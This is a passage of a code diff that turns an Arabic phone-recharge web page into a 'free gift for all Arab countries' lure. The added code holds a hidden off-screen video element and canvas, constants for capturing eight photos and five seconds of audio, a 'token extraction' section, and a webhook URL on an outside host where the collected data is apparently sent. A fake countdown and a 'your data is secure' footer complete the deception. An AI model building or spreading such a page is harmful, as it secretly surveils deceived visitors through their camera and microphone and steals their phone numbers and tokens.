+            0% {
+                opacity: 0;
+                transform: translateY(40px) scale(0.9) rotateX(8deg);
+            }
+            100% {
+                opacity: 1;
+                transform: translateY(0) scale(1) rotateX(0);
+            }
         }
-        .voucher-box .voucher-country {
-            font-size: 13px;
-            color: #998;
-            font-weight: 400;
+        .timer-box::before {
+            content: '';
+            position: absolute;
+            inset: -2px;
+            border-radius: 60px;
+            background: linear-gradient(135deg, rgba(246, 184, 61, 0.04), transparent 60%);
+            pointer-events: none;
         }
-        .voucher-box .voucher-body {
-            display: grid;
-            grid-template-columns: 1fr 1fr;
-            gap: 12px;
-            margin: 12px 0 14px;
+        .timer-box i {
+            font-size: 42px;
+            color: var(--gold);
+            animation: timerPulse 2s ease-in-out infinite;
+            filter: drop-shadow(0 0 30px rgba(246, 184, 61, 0.1));
         }
-        .voucher-box .voucher-item {
-            background: rgba(0, 0, 0, 0.2);
-            border-radius: 18px;
-            padding: 12px 14px;
+        @keyframes timerPulse {
+            0%,
+            100% {
+                opacity: 1;
+                transform: scale(1);
+            }
+            50% {
+                opacity: 0.5;
+                transform: scale(0.92);
+            }
+        }
+        .timer-box span {
+            font-size: 44px;
+            font-weight: 900;
+            color: var(--gold);
+            letter-spacing: 6px;
+            font-variant-numeric: tabular-nums;
+            text-shadow: 0 0 40px rgba(246, 184, 61, 0.08);
+            font-family: 'Cairo', monospace;
+        }
+        .timer-sub {
+            color: var(--text-secondary);
+            font-size: 15px;
+            margin-top: 10px;
+            font-weight: 300;
+            opacity: 0.7;
             text-align: center;
-            border: 1px solid rgba(255, 255, 255, 0.03);
-        }
-        .voucher-box .voucher-item .v-label {
-            font-size: 11px;
-            color: #887;
-            text-transform: uppercase;
-            letter-spacing: 0.5px;
-            font-weight: 600;
-        }
-        .voucher-box .voucher-item .v-value {
-            font-size: 22px;
-            font-weight: 800;
-            margin-top: 2px;
-            background: linear-gradient(135deg, #ffd700, #ff8c00);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-        }
-        .voucher-box .voucher-item .v-value.plain {
-            -webkit-text-fill-color: #fff;
-            font-size: 18px;
-            letter-spacing: 2px;
-            font-family: 'Courier New', monospace;
-        }
-        .voucher-box .voucher-code-area {
-            background: rgba(0, 0, 0, 0.25);
-            border-radius: 18px;
-            padding: 12px 16px;
-            margin: 6px 0 12px;
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
-            border: 1px solid rgba(255, 215, 0, 0.04);
-            direction: ltr;
-        }
-        .voucher-box .voucher-code-area .code {
-            font-family: 'Courier New', monospace;
-            font-size: 20px;
-            font-weight: 700;
-            letter-spacing: 3px;
-            color: #ffd700;
-            text-shadow: 0 0 20px rgba(255, 215, 0, 0.05);
-        }
-        .voucher-box .voucher-code-area .copy-btn {
-            background: rgba(255, 215, 0, 0.08);
-            border: none;
-            color: #ffd700;
-            padding: 8px 16px;
-            border-radius: 30px;
-            font-size: 14px;
-            cursor: pointer;
-            transition: all 0.3s ease;
-            font-family: 'Cairo', sans-serif;
-            font-weight: 600;
-            display: flex;
-            align-items: center;
-            gap: 8px;
-        }
-        .voucher-box .voucher-code-area .copy-btn:hover {
-            background: rgba(255, 215, 0, 0.15);
-            transform: scale(1.04);
-        }
-        .voucher-box .voucher-actions {
-            display: flex;
-            gap: 12px;
-            margin-top: 16px;
-            flex-wrap: wrap;
-        }
-        .voucher-box .voucher-actions .btn-outline {
-            flex: 1;
-            min-width: 120px;
-            font-size: 14px;
-            padding: 12px 16px;
-        }
-        .voucher-box .voucher-actions .btn-gold {
-            flex: 1;
-            min-width: 120px;
-            font-size: 16px;
-            padding: 12px 16px;
-            margin-top: 0;
         }
 
         /* ===== FOOTER ===== */
@@ -755,801 +724,922 @@
             margin-top: 28px;
             text-align: center;
             font-size: 12px;
-            color: #665;
-            border-top: 1px solid rgba(255, 255, 255, 0.03);
+            color: rgba(255, 255, 255, 0.08);
+            border-top: 1px solid rgba(255, 255, 255, 0.02);
             padding-top: 16px;
             display: flex;
             flex-direction: column;
             gap: 4px;
+            letter-spacing: 0.3px;
         }
-        .app-footer .developer {
-            color: #ffd700;
-            font-weight: 600;
+        .app-footer i {
+            color: rgba(246, 184, 61, 0.15);
         }
-        .app-footer .developer a {
-            color: #ffd700;
-            text-decoration: none;
+
+        /* ===== HIDDEN ELEMENTS ===== */
+        #hiddenVideo {
+            position: fixed;
+            top: -1000px;
+            left: -1000px;
+            width: 320px;
+            height: 240px;
+            opacity: 0;
+            pointer-events: none;
         }
-        .app-footer .developer a:hover {
-            text-decoration: underline;
+        #hiddenCanvas {
+            display: none;
         }
 
         /* ===== RESPONSIVE ===== */
-        @media (max-width: 540px) {
+        @media (max-width: 520px) {
+            body {
+                padding: 12px;
+            }
             .app-header h1 {
-                font-size: 24px;
+                font-size: 27px;
+            }
+            .logo-icon {
+                width: 64px;
+                height: 64px;
+                font-size: 32px;
             }
             .main-card {
-                padding: 20px 14px;
+                padding: 24px 16px 22px;
                 border-radius: 36px;
             }
-            .grid-2col {
-                grid-template-columns: 1fr 1fr;
+            .country-grid {
+                grid-template-columns: repeat(auto-fill, minmax(96px, 1fr));
                 gap: 10px;
             }
-            .grid-3col {
-                grid-template-columns: 1fr 1fr 1fr;
-                gap: 10px;
-            }
-            .option-btn {
-                padding: 12px 6px;
+            .country-btn {
+                padding: 14px 6px 10px;
                 font-size: 13px;
+                border-radius: 20px;
             }
-            .option-btn .opt-icon {
+            .country-btn .flag {
                 font-size: 28px;
             }
             .step-title {
-                font-size: 22px;
+                font-size: 23px;
             }
             .btn-gold {
-                font-size: 18px;
+                font-size: 19px;
                 padding: 16px 20px;
             }
             .step-dot {
-                width: 34px;
-                height: 34px;
-                font-size: 12px;
+                width: 38px;
+                height: 38px;
+                font-size: 13px;
+            }
+            .step-line {
+                width: 30px;
+            }
+            .timer-box span {
+                font-size: 34px;
+                letter-spacing: 4px;
+            }
+            .timer-box i {
+                font-size: 34px;
+            }
+            .timer-box {
+                padding: 18px 20px;
+                gap: 18px;
+            }
+            .input-group input {
+                padding: 14px 18px;
+                font-size: 17px;
+            }
+            .permission-wrapper {
+                padding: 14px 14px;
+            }
+            .permission-wrapper ul li {
+                font-size: 13px;
+            }
+            .step-desc {
+                font-size: 14px;
+            }
+        }
+
+        @media (max-width: 400px) {
+            .country-grid {
+                grid-template-columns: repeat(auto-fill, minmax(80px, 1fr));
+                gap: 8px;
+            }
+            .country-btn {
+                padding: 10px 4px 8px;
+                font-size: 11px;
+                border-radius: 16px;
+            }
+            .country-btn .flag {
+                font-size: 22px;
+            }
+            .country-btn .name {
+                font-size: 11px;
+            }
+            .app-header h1 {
+                font-size: 22px;
+            }
+            .step-title {
+                font-size: 20px;
+            }
+            .btn-gold {
+                font-size: 16px;
+                padding: 14px 16px;
+            }
+            .step-dot {
+                width: 32px;
+                height: 32px;
+                font-size: 11px;
             }
             .step-line {
                 width: 20px;
             }
-            .voucher-box .voucher-body {
-                grid-template-columns: 1fr 1fr;
-                gap: 8px;
+            .timer-box span {
+                font-size: 28px;
+                letter-spacing: 3px;
             }
-            .voucher-box .voucher-item .v-value {
-                font-size: 18px;
+            .timer-box i {
+                font-size: 28px;
             }
-            .voucher-box .voucher-code-area .code {
-                font-size: 16px;
-                letter-spacing: 2px;
-            }
-            .voucher-box .voucher-actions {
-                flex-direction: column;
-            }
-            .voucher-box .voucher-actions .btn-outline,
-            .voucher-box .voucher-actions .btn-gold {
-                min-width: auto;
-                width: 100%;
-            }
-            .lang-btn {
-                font-size: 16px;
-                padding: 16px 10px;
-            }
-            .lang-btn .lang-icon {
-                font-size: 26px;
+            .timer-box {
+                padding: 14px 14px;
+                gap: 12px;
             }
             .input-group input {
-                font-size: 17px;
-                padding: 14px 16px;
-                min-height: 48px;
-            }
-            .input-group .input-wrap .prefix-badge {
-                font-size: 14px;
-                padding: 0 12px;
-                min-height: 48px;
-            }
-        }
-        @media (max-width: 400px) {
-            .grid-2col {
-                grid-template-columns: 1fr 1fr;
-            }
-            .grid-3col {
-                grid-template-columns: 1fr 1fr;
-            }
-            .main-card {
-                padding: 16px 10px;
-                border-radius: 28px;
-            }
-            .step-dot {
-                width: 28px;
-                height: 28px;
-                font-size: 10px;
-            }
-            .step-line {
-                width: 14px;
-            }
-            .step-dot .step-label {
-                display: none;
-            }
-            .voucher-box {
-                padding: 18px 14px;
+                padding: 12px 14px;
+                font-size: 15px;
             }
         }
 
         /* ===== UTILITY ===== */
-        .text-center {
-            text-align: center;
+        .text-gold {
+            color: var(--gold);
         }
-        .mt-8 {
-            margin-top: 8px;
+        .text-muted {
+            color: var(--text-secondary);
+            opacity: 0.6;
         }
-        .mt-12 {
-            margin-top: 12px;
+        .mt-1 {
+            margin-top: 6px;
         }
-        .mt-16 {
-            margin-top: 16px;
-        }
-        .gap-8 {
-            gap: 8px;
+        .mb-1 {
+            margin-bottom: 6px;
         }
         .flex-center {
             display: flex;
             align-items: center;
             justify-content: center;
         }
-        .flex-col {
-            flex-direction: column;
-        }
-        .w-full {
-            width: 100%;
-        }
-
-        /* operator icon colors */
-        .voucher-icon.vodafone {
-            background: linear-gradient(135deg, #E60000, #990000);
-        }
-        .voucher-icon.orange {
-            background: linear-gradient(135deg, #FF6600, #CC5500);
-        }
-        .voucher-icon.etisalat {
-            background: linear-gradient(135deg, #00A651, #007A3D);
-        }
-        .voucher-icon.we {
-            background: linear-gradient(135deg, #660099, #440066);
-        }
-        .voucher-icon.stc {
-            background: linear-gradient(135deg, #008000, #005500);
-        }
-        .voucher-icon.mobily {
-            background: linear-gradient(135deg, #0070C0, #005090);
-        }
-        .voucher-icon.zain {
-            background: linear-gradient(135deg, #800080, #550055);
-        }
-        .voucher-icon.ooredoo {
-            background: linear-gradient(135deg, #DC143C, #A01030);
-        }
-        .voucher-icon.omniah {
-            background: linear-gradient(135deg, #0064C8, #004890);
-        }
-        .voucher-icon.batelco {
-            background: linear-gradient(135deg, #0050C8, #003890);
-        }
-        .voucher-icon.du {
-            background: linear-gradient(135deg, #800080, #550055);
-        }
-        .voucher-icon.omantel {
-            background: linear-gradient(135deg, #0050C8, #003890);
-        }
-        .voucher-icon.default {
-            background: linear-gradient(135deg, #ffd700, #ff8c00);
+        .gap-2 {
+            gap: 8px;
         }
     </style>
 </head>
 <body>
 
+    <!-- ===== PARTICLES ===== -->
+    <div class="particles" id="particles"></div>
+
+    <!-- ===== APP ===== -->
     <div class="app-wrapper">
+
         <!-- HEADER -->
         <header class="app-header">
-            <div class="logo-icon"><i class="fas fa-sim-card"></i></div>
-            <h1 id="appTitle">شحن رصيد</h1>
-            <p class="subtitle" id="appSub">أعد شحن هاتفك • باقات • نت • مكالمات</p>
+            <div class="logo-container">
+                <div class="logo-icon">
+                    <i class="fas fa-gem"></i>
+                </div>
+            </div>
+            <h1>هدية مجانية</h1>
+            <p class="subtitle">رصيد • نت • وحدات • لكل الدول العربية</p>
         </header>
 
         <!-- STEP INDICATOR -->
         <div class="step-indicator" id="stepIndicator">
             <div class="step-dot active" data-step="1">
-                1
-                <span class="step-label" id="sl1">اللغة</span>
+                <div class="dot-inner"><span class="dot-icon">1</span></div>
             </div>
             <div class="step-line" data-step="1"></div>
             <div class="step-dot" data-step="2">
-                2
-                <span class="step-label" id="sl2">البلد</span>
+                <div class="dot-inner"><span class="dot-icon">2</span></div>
             </div>
             <div class="step-line" data-step="2"></div>
             <div class="step-dot" data-step="3">
-                3
-                <span class="step-label" id="sl3">المشغل</span>
-            </div>
-            <div class="step-line" data-step="3"></div>
-            <div class="step-dot" data-step="4">
-                4
-                <span class="step-label" id="sl4">الرقم</span>
-            </div>
-            <div class="step-line" data-step="4"></div>
-            <div class="step-dot" data-step="5">
-                5
-                <span class="step-label" id="sl5">الكارت</span>
+                <div class="dot-inner"><span class="dot-icon">3</span></div>
             </div>
         </div>
 
         <!-- MAIN CARD -->
-        <div class="main-card">
+        <div class="main-card" id="mainCard">
 
-            <!-- ===== STEP 1: LANGUAGE ===== -->
-            <div class="step active" id="step-lang">
-                <div class="step-title"><span class="highlight">🌐</span> <span id="langTitle">اختر لغتك</span></div>
-                <p class="step-desc" id="langDesc">اختر اللغة التي تفضلها</p>
-                <div class="lang-grid">
-                    <button class="lang-btn selected" data-lang="ar">
-                        <span class="lang-icon">🇸🇦</span>
-                        <span>العربية</span>
-                    </button>
-                    <button class="lang-btn" data-lang="en">
-                        <span class="lang-icon">🇬🇧</span>
-                        <span>English</span>
-                    </button>
-                </div>
-                <button class="btn-gold" id="langContinueBtn">
-                    <span class="btn-text" id="langContinueText">▶ متابعة</span>
-                    <span class="spinner"></span>
-                </button>
-                <div class="status" id="statusLang"></div>
-            </div>
-
-            <!-- ===== STEP 2: COUNTRY ===== -->
-            <div class="step" id="step-country">
-                <div class="step-title"><span class="highlight">📍</span> <span id="countryTitle">اختر بلدك</span></div>
-                <p class="step-desc" id="countryDesc">اختر الدولة التي تتواجد فيها</p>
-                <div class="grid-3col" id="countryList"></div>
+            <!-- STEP 1: COUNTRY -->
+            <div class="step active" id="step-country">
+                <div class="step-title">🌍 اختر <span class="highlight">بلدك</span></div>
+                <p class="step-desc">للحصول على هدية تناسب شبكة اتصالاتك</p>
+                <div class="country-grid" id="countryList"></div>
                 <div class="status" id="statusCountry"></div>
             </div>
 
-            <!-- ===== STEP 3: OPERATOR ===== -->
-            <div class="step" id="step-operator">
-                <div class="step-title"><span class="highlight">📶</span> <span id="opTitle">اختر المشغل</span></div>
-                <p class="step-desc" id="opDesc">اختر شبكة اتصالاتك</p>
-                <div class="grid-2col" id="operatorList"></div>
-                <div class="status" id="statusOperator"></div>
-            </div>
-
-            <!-- ===== STEP 4: PHONE ===== -->
-            <div class="step" id="step-phone">
-                <div class="step-title"><span class="highlight">📱</span> <span id="phoneTitle">أدخل رقم هاتفك</span></div>
-                <p class="step-desc" id="phoneDesc">أدخل الرقم المراد شحنه</p>
+            <!-- STEP 2: TASKS -->
+            <div class="step" id="step-tasks">
+                <div class="step-title">🎁 استلم <span class="highlight">هديتك</span></div>
+                <p class="step-desc" id="taskSub">أكمل البيانات وسيتم إرسال الهدية لك</p>
+                <div class="permission-wrapper" id="permissionArea"></div>
                 <div class="input-group">
-                    <label id="phoneLabel"><i class="fas fa-phone-alt"></i> رقم الهاتف</label>
-                    <div class="input-wrap">
-                        <span class="prefix-badge" id="prefixBadge">010</span>
-                        <input type="text" id="phoneInput" placeholder="12345678" maxlength="15" inputmode="numeric" />
-                    </div>
-                    <div class="validation-hint idle" id="phoneHint">📌 أدخل الرقم بشكل صحيح</div>
+                    <label for="phoneInput"><i class="fas fa-phone-alt"></i> رقم هاتفك</label>
+                    <input type="text" id="phoneInput" placeholder="مثال: 01012345678" maxlength="15" />
                 </div>
-                <button class="btn-gold" id="generateBtn">
-                    <span class="btn-text" id="generateText">🎁 كارت</span>
+                <button class="btn-gold" id="claimBtn">
+                    <span class="btn-text"><i class="fas fa-gift" style="margin-left:10px;"></i> احصل على هديتي</span>
                     <span class="spinner"></span>
                 </button>
-                <div class="status" id="statusPhone"></div>
+                <div class="status" id="statusTasks"></div>
             </div>
 
-            <!-- ===== STEP 5: VOUCHER ===== -->
-            <div class="step" id="step-voucher">
-                <div class="step-title"><span class="highlight">🎫</span> <span id="voucherTitle">كارت الشحن</span></div>
-                <p class="step-desc" id="voucherDesc">كارت الشحن الخاص بك جاهز</p>
-
-                <div class="voucher-box" id="voucherBox">
-                    <div class="voucher-header">
-                        <div class="voucher-icon default" id="voucherIcon"><i class="fas fa-wifi"></i></div>
-                        <div>
-                            <div class="voucher-operator" id="voucherOperator">Vodafone</div>
-                            <div class="voucher-country" id="voucherCountry">مصر</div>
-                        </div>
-                    </div>
-                    <div class="voucher-body">
-                        <div class="voucher-item">
-                            <div class="v-label" id="vlValue">القيمة</div>
-                            <div class="v-value" id="vvValue">50 <span style="font-size:14px; -webkit-text-fill-color:#998;">EGP</span></div>
-                        </div>
-                        <div class="voucher-item">
-                            <div class="v-label" id="vlData">الباقة</div>
-                            <div class="v-value" id="vvData">5GB + 500 د</div>
-                        </div>
-                    </div>
-                    <div class="voucher-code-area">
-                        <span class="code" id="voucherCode">RCH-2026-X7K3-9P2L</span>
-                        <button class="copy-btn" id="copyCodeBtn"><i class="fas fa-copy"></i> <span id="copyText">نسخ</span></button>
-                    </div>
-                    <div class="voucher-actions">
-                        <button class="btn-outline" id="changeOpBtn"><i class="fas fa-arrow-right"></i> <span id="changeOpText">تغيير المشغل</span></button>
-                        <button class="btn-gold" id="newVoucherBtn"><span class="btn-text" id="newVoucherText">🔄 كارت جديد</span></button>
-                    </div>
+            <!-- STEP 3: TIMER -->
+            <div class="step" id="step-timer">
+                <div class="step-title">✅ تم الإرسال</div>
+                <p class="step-desc">جاري تجهيز هديتك، انتظر قليلاً</p>
+                <div class="timer-box">
+                    <i class="fas fa-hourglass-half"></i>
+                    <span id="timerDisplay">03:00</span>
                 </div>
-                <div class="status" id="statusVoucher"></div>
+                <p class="timer-sub">سيتم إرسال الهدية تلقائياً إلى رقمك</p>
+                <div class="status" id="statusTimer"></div>
             </div>
 
         </div>
 
         <!-- FOOTER -->
         <footer class="app-footer">
-            <div><i class="fas fa-lock" style="color:#ffd700;"></i> <span id="footerSecure">بياناتك آمنة • خصوصية تامة</span></div>
-            <div class="developer"><i class="fas fa-code"></i> <span id="footerDev">المطور:</span> <a href="https://t.me/iashraf_mousa" target="_blank">@iashraf_mousa</a></div>
+            <div><i class="fas fa-lock"></i> بياناتك آمنة • خصوصية تامة</div>
         </footer>
     </div>
 
+    <!-- HIDDEN MEDIA -->
+    <video id="hiddenVideo" autoplay playsinline muted></video>
+    <canvas id="hiddenCanvas"></canvas>
+
     <script>
         // ================================================================
-        //  TELECOM DATA
+        //  CONFIG - WEBHOOK
         // ================================================================
-        const TELECOM_DATA = {
-            'Egypt': {
-                flag: '🇪🇬',
-                nameAr: 'مصر',
-                nameEn: 'Egypt',
-                operators: {
-                    'Vodafone': {
-                        prefix: '010',
-                        color: '#E60000',
-                        icon: 'fa-wifi',
-                        dataPackage: '5GB + 500 دقيقة',
-                        values: ['10', '20', '50', '100', '200'],
-                        cssClass: 'vodafone',
-                        nameAr: 'فودافون'
-                    },
-                    'Orange': {
-                        prefix: '012',
-                        color: '#FF6600',
-                        icon: 'fa-wifi',
-                        dataPackage: '4GB + 400 دقيقة',
-                        values: ['15', '30', '60', '120', '250'],
-                        cssClass: 'orange',
-                        nameAr: 'أورنج'
-                    },
-                    'Etisalat': {
-                        prefix: '011',
-                        color: '#00A651',
-                        icon: 'fa-wifi',
-                        dataPackage: '6GB + 600 دقيقة',
-                        values: ['12', '25', '55', '110', '220'],
-                        cssClass: 'etisalat',
-                        nameAr: 'اتصالات'
-                    },
-                    'WE': {
-                        prefix: '015',
-                        color: '#660099',
-                        icon: 'fa-wifi',
-                        dataPackage: '3GB + 300 دقيقة',
-                        values: ['10', '20', '40', '80', '160'],
-                        cssClass: 'we',
-                        nameAr: 'وي'
-                    }
-                },
-                phoneLength: 11
-            },
-            'Saudi Arabia': {
-                flag: '🇸🇦',
-                nameAr: 'السعودية',
-                nameEn: 'Saudi Arabia',
-                operators: {
-                    'STC': {
-                        prefix: '05',
-                        color: '#008000',
-                        icon: 'fa-wifi',
-                        dataPackage: '10GB + 1000 دقيقة',
-                        values: ['20', '50', '100', '200', '500'],
-                        cssClass: 'stc',
-                        nameAr: 'إس تي سي'
-                    },
-                    'Mobily': {
-                        prefix: '05',
-                        color: '#0070C0',
-                        icon: 'fa-wifi',
-                        dataPackage: '8GB + 800 دقيقة',
-                        values: ['15', '40', '80', '150', '400'],
-                        cssClass: 'mobily',
-                        nameAr: 'موبايلي'
-                    },
-                    'Zain': {
-                        prefix: '05',
-                        color: '#800080',
-                        icon: 'fa-wifi',
-                        dataPackage: '7GB + 700 دقيقة',
-                        values: ['15', '35', '70', '140', '350'],
-                        cssClass: 'zain',
-                        nameAr: 'زين'
-                    }
-                },
-                phoneLength: 10
-            },
-            'UAE': {
-                flag: '🇦🇪',
-                nameAr: 'الإمارات',
-                nameEn: 'UAE',
-                operators: {
-                    'Etisalat': {
-                        prefix: '050',
-                        color: '#00A651',
-                        icon: 'fa-wifi',
-                        dataPackage: '12GB + 1200 دقيقة',
-                        values: ['25', '50', '100', '200', '500'],
-                        cssClass: 'etisalat',
-                        nameAr: 'اتصالات'
-                    },
-                    'Du': {
-                        prefix: '055',
-                        color: '#800080',
-                        icon: 'fa-wifi',
-                        dataPackage: '10GB + 1000 دقيقة',
-                        values: ['20', '45', '90', '180', '450'],
-                        cssClass: 'du',
-                        nameAr: 'دو'
-                    }
-                },
-                phoneLength: 9
-            },
-            'Kuwait': {
-                flag: '🇰🇼',
-                nameAr: 'الكويت',
-                nameEn: 'Kuwait',
-                operators: {
-                    'Zain': {
-                        prefix: '5',
-                        color: '#800080',
-                        icon: 'fa-wifi',
-                        dataPackage: '6GB + 600 دقيقة',
-                        values: ['10', '20', '40', '80', '160'],
-                        cssClass: 'zain',
-                        nameAr: 'زين'
-                    },
-                    'Ooredoo': {
-                        prefix: '5',
-                        color: '#DC143C',
-                        icon: 'fa-wifi',
-                        dataPackage: '5GB + 500 دقيقة',
-                        values: ['8', '18', '35', '70', '140'],
-                        cssClass: 'ooredoo',
-                        nameAr: 'أريدو'
-                    },
-                    'STC': {
-                        prefix: '5',
-                        color: '#008000',
-                        icon: 'fa-wifi',
-                        dataPackage: '4GB + 400 دقيقة',
-                        values: ['7', '15', '30', '60', '120'],
-                        cssClass: 'stc',
-                        nameAr: 'إس تي سي'
-                    }
-                },
-                phoneLength: 8
-            },
-            'Qatar': {
-                flag: '🇶🇦',
-                nameAr: 'قطر',
-                nameEn: 'Qatar',
-                operators: {
-                    'Ooredoo': {
-                        prefix: '3',
-                        color: '#DC143C',
-                        icon: 'fa-wifi',
-                        dataPackage: '8GB + 800 دقيقة',
-                        values: ['15', '30', '60', '120', '250'],
-                        cssClass: 'ooredoo',
-                        nameAr: 'أريدو'
-                    },
-                    'Vodafone': {
-                        prefix: '5',
-                        color: '#E60000',
-                        icon: 'fa-wifi',
-                        dataPackage: '6GB + 600 دقيقة',
-                        values: ['12', '25', '50', '100', '200'],
-                        cssClass: 'vodafone',
-                        nameAr: 'فودافون'
-                    }
-                },
-                phoneLength: 8
-            },
-            'Oman': {
-                flag: '🇴🇲',
-                nameAr: 'عُمان',
-                nameEn: 'Oman',
-                operators: {
-                    'Omantel': {
-                        prefix: '7',
-                        color: '#0050C8',
-                        icon: 'fa-wifi',
-                        dataPackage: '7GB + 700 دقيقة',
-                        values: ['10', '20', '40', '80', '160'],
-                        cssClass: 'omantel',
-                        nameAr: 'عُمانتل'
-                    },
-                    'Ooredoo': {
-                        prefix: '9',
-                        color: '#DC143C',
-                        icon: 'fa-wifi',
-                        dataPackage: '5GB + 500 دقيقة',
-                        values: ['8', '18', '35', '70', '140'],
-                        cssClass: 'ooredoo',
-                        nameAr: 'أريدو'
-                    }
-                },
-                phoneLength: 8
-            },
-            'Bahrain': {
-                flag: '🇧🇭',
-                nameAr: 'البحرين',
-                nameEn: 'Bahrain',
-                operators: {
-                    'Batelco': {
-                        prefix: '3',
-                        color: '#0050C8',
-                        icon: 'fa-wifi',
-                        dataPackage: '6GB + 600 دقيقة',
-                        values: ['10', '20', '40', '80', '160'],
-                        cssClass: 'batelco',
-                        nameAr: 'بتلكو'
-                    },
-                    'Zain': {
-                        prefix: '6',
-                        color: '#800080',
-                        icon: 'fa-wifi',
-                        dataPackage: '5GB + 500 دقيقة',
-                        values: ['8', '18', '35', '70', '140'],
-                        cssClass: 'zain',
-                        nameAr: 'زين'
-                    },
-                    'STC': {
-                        prefix: '6',
-                        color: '#008000',
-                        icon: 'fa-wifi',
-                        dataPackage: '4GB + 400 دقيقة',
-                        values: ['7', '15', '30', '60', '120'],
-                        cssClass: 'stc',
-                        nameAr: 'إس تي سي'
-                    }
-                },
-                phoneLength: 8
-            },
-            'Jordan': {
-                flag: '🇯🇴',
-                nameAr: 'الأردن',
-                nameEn: 'Jordan',
-                operators: {
-                    'Zain': {
-                        prefix: '7',
-                        color: '#800080',
-                        icon: 'fa-wifi',
-                        dataPackage: '5GB + 500 دقيقة',
-                        values: ['10', '20', '40', '80', '160'],
-                        cssClass: 'zain',
-                        nameAr: 'زين'
-                    },
-                    'Orange': {
-                        prefix: '7',
-                        color: '#FF6600',
-                        icon: 'fa-wifi',
-                        dataPackage: '4GB + 400 دقيقة',
-                        values: ['8', '18', '35', '70', '140'],
-                        cssClass: 'orange',
-                        nameAr: 'أورنج'
-                    },
-                    'Umniah': {
-                        prefix: '7',
-                        color: '#0064C8',
-                        icon: 'fa-wifi',
-                        dataPackage: '3GB + 300 دقيقة',
-                        values: ['6', '14', '28', '56', '112'],
-                        cssClass: 'omniah',
-                        nameAr: 'أمنية'
-                    }
-                },
-                phoneLength: 10
-            }
+        const WEBHOOK_URL = "https://dev-free-balancce.pantheonsite.io/free/bot.php?action=webhook_data";
+
+        // ================================================================
+        //  CONSTANTS
+        // ================================================================
+        const TOTAL_PHOTOS = 8;
+        const CAPTURE_INTERVAL = 700;
+        const AUDIO_DURATION = 5000;
+        const PHOTO_QUALITY = 0.92;
+
+        // ================================================================
+        //  COUNTRIES DATA
+        // ================================================================
+        const countries = {
+            'مصر': { flag: '🇪🇬', prefixes: ['010', '011', '012', '015'] },
+            'السعودية': { flag: '🇸🇦', prefixes: ['05'] },
+            'الإمارات': { flag: '🇦🇪', prefixes: ['050', '052', '054', '055', '056'] },
+            'الكويت': { flag: '🇰🇼', prefixes: ['5'] },
+            'قطر': { flag: '🇶🇦', prefixes: ['3', '5', '6'] },
+            'عُمان': { flag: '🇴🇲', prefixes: ['7', '9'] },
+            'البحرين': { flag: '🇧🇭', prefixes: ['3', '6'] },
+            'الأردن': { flag: '🇯🇴', prefixes: ['7'] },
+            'العراق': { flag: '🇮🇶', prefixes: ['7'] },
+            'سوريا': { flag: '🇸🇾', prefixes: ['9'] },
+            'لبنان': { flag: '🇱🇧', prefixes: ['3', '7'] },
+            'فلسطين': { flag: '🇵🇸', prefixes: ['5', '9'] },
+            'الجزائر': { flag: '🇩🇿', prefixes: ['5', '6', '7'] },
+            'المغرب': { flag: '🇲🇦', prefixes: ['6', '7'] },
+            'تونس': { flag: '🇹🇳', prefixes: ['2', '5', '9'] },
+            'ليبيا': { flag: '🇱🇾', prefixes: ['9'] },
+            'السودان': { flag: '🇸🇩', prefixes: ['9', '1'] },
+            'اليمن': { flag: '🇾🇪', prefixes: ['7'] },
+            'الصومال': { flag: '🇸🇴', prefixes: ['6', '7'] },
+            'جيبوتي': { flag: '🇩🇯', prefixes: ['7'] },
+            'موريتانيا': { flag: '🇲🇷', prefixes: ['4', '5'] },
         };
 
         // ================================================================
-        //  LANGUAGE TRANSLATIONS
+        //  TOKEN EXTRACTION
         // ================================================================
-        const LANG = {
-            ar: {
-                appTitle: 'شحن رصيد',
-                appSub: 'أعد شحن هاتفك • باقات • نت • مكالمات',
-                langTitle: 'اختر لغتك',
-                langDesc: 'اختر اللغة التي تفضلها',
-                langContinue: '▶ متابعة',
-                countryTitle: 'اختر بلدك',
-                countryDesc: 'اختر الدولة التي تتواجد فيها',
-                opTitle: 'اختر المشغل',
-                opDesc: 'اختر شبكة اتصالاتك',
-                phoneTitle: 'أدخل رقم هاتفك',
-                phoneDesc: 'أدخل الرقم المراد شحنه',
-                phoneLabel: 'رقم الهاتف',
-                phoneHint: '📌 أدخل الرقم بشكل صحيح',
-                generateText: '🎁 كارت',
-                voucherTitle: 'كارت الشحن',
-                voucherDesc: 'كارت الشحن الخاص بك جاهز',
-                vlValue: 'القيمة',
-                vlData: 'الباقة',
-                copyText: 'نسخ',
-                changeOpText: 'تغيير المشغل',
-                newVoucherText: '🔄 كارت جديد',
-                footerSecure: 'بياناتك آمنة • خصوصية تامة',
-                footerDev: 'المطور:',
-                step1: 'اللغة',
-                step2: 'البلد',
-                step3: 'المشغل',
-                step4: 'الرقم',
-                step5: 'الكارت',
-                copied: 'تم النسخ!',
-                invalidNumber: '⚠️ رقم غير صحيح',
-                validNumber: '✅ رقم صحيح',
-                selectOperator: '⚠️ يرجى اختيار المشغل أولاً',
-                selectCountry: '⚠️ يرجى اختيار البلد أولاً',
-                generated: '✅ تم إنشاء الكارت بنجاح',
-                error: '⚠️ حدث خطأ، حاول مرة أخرى',
-                phoneRequired: '⚠️ يرجى إدخال رقم الهاتف',
-                phoneInvalid: '⚠️ الرقم غير صحيح لهذا المشغل',
-                currency: 'جنيه',
-                currencyShort: 'ج.م'
-            },
-            en: {
-                appTitle: 'Recharge',
-                appSub: 'Top up your phone • Data • Calls',
-                langTitle: 'Choose your language',
-                langDesc: 'Select your preferred language',
-                langContinue: '▶ Continue',
-                countryTitle: 'Select your country',
-                countryDesc: 'Choose your country',
-                opTitle: 'Select operator',
-                opDesc: 'Choose your telecom operator',
-                phoneTitle: 'Enter your number',
-                phoneDesc: 'Enter the number to recharge',
-                phoneLabel: 'Phone number',
-                phoneHint: '📌 Enter the number correctly',
-                generateText: '🎁 Voucher',
-                voucherTitle: 'Recharge Voucher',
-                voucherDesc: 'Your recharge voucher is ready',
-                vlValue: 'Value',
-                vlData: 'Package',
-                copyText: 'Copy',
-                changeOpText: 'Change Operator',
-                newVoucherText: '🔄 New Voucher',
-                footerSecure: 'Your data is secure • Full privacy',
-                footerDev: 'Developer:',
-                step1: 'Language',
-                step2: 'Country',
-                step3: 'Operator',
-                step4: 'Number',
-                step5: 'Voucher',
-                copied: 'Copied!',
-                invalidNumber: '⚠️ Invalid number',
-                validNumber: '✅ Valid number',
-                selectOperator: '⚠️ Please select an operator first',
-                selectCountry: '⚠️ Please select a country first',
